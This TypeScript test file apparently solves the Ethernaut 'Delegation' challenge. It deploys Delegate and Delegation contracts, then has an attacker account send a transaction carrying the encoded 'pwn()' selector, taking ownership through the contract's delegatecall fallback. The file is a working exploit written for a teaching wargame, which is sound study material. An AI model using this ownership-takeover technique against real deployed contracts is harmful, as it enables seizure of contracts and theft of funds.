import { accounts, contract, web3 } from '@openzeppelin/test-environment';

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const Delegate = contract.fromArtifact('Delegate');
const Delegation = contract.fromArtifact('Delegation');
let delegate: any;
let delegation: any;

beforeEach(async () => {
    delegate = await Delegate.new(owner, { from: owner });
    delegation = await Delegation.new(delegate.address, { from: owner });
});

it('Delegation -> claim ownership of Delegation contract', async () => {

    console.log('before', await delegation.owner.call());

    const payload = web3.eth.abi.encodeFunctionSignature({
        name: 'pwn',
        type: 'function',
        inputs: []
    });

    await delegation.sendTransaction({
        from: attacker,
        data: payload,
    });

    console.log('after', await delegation.owner.call());
});

